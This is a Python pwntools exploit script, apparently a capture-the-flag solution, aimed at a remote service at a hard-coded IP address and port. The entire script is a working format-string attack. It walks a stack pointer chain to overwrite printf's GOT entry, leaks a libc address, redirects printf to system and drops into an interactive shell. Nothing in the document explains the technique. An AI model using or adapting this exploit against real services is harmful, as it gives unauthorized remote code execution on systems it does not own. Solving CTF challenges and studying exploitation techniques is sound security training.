from pwn import *
import re

host = '140.115.59.7'
port = 11009
y = remote( host , port )

printf_got = 0x804a010
printf_offset = 0x49590
system_offset = 0x3ad80

def pp(pay):
    p = pay + '|END\n\x00'
    y.sendline(p)
    sleep(1)
    y.recvuntil('END\n')

y.recvline()
y.recvline()
y.recvline()

y.sendline( '%10$x' )
_10 = y.recvline()
ad2 = _10[6:8]

ad = hex(printf_got)[2:].rjust(8,'0')

a = '%.' + str( int( ad[4:] , 16 ) + 0x0 ) + 'x%10$hn'
pp( a )    #____xxxx + 10

a = '%.'+str(int(ad2,16)+2)+'x%6$hhn'
pp( a )

a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____

a = '%.'+str(int(ad2,16)+4)+'x%6$hhn'
pp( a )

a = '%.' + str( int( ad[4:] , 16 ) + 0x2 ) + 'x%10$hn'
pp( a )    #xxxx____

a = '%.'+str(int(ad2,16)+6)+'x%6$hhn'
pp( a )

a = '%.' + str( int( ad[:4] , 16 ) ) + 'x%10$hn'
pp( a )    #xxxx____

a = '%.'+str(int(ad2,16)-2)+'x%6$hhn'
pp( a )

y.sendline( '%14$s' )
leak = y.recv(1024)
log.info(leak)
printf_addr = u32(leak[:4])
log.info(hex(printf_addr))

libc_base = printf_addr - printf_offset
system_addr = libc_base + system_offset

ad3 = hex(system_addr)[2:].rjust(8,'0')

a = '%.'+str(int( ad3[4:] , 16 ))+'x%14$hn'+'%.'+str( int( ad3[:4] , 16 ) - int( ad3[4:] , 16 ) )+'x%15$hn'
pp( a )
sleep(1)

y.sendline('sh\x00')

y.interactive()
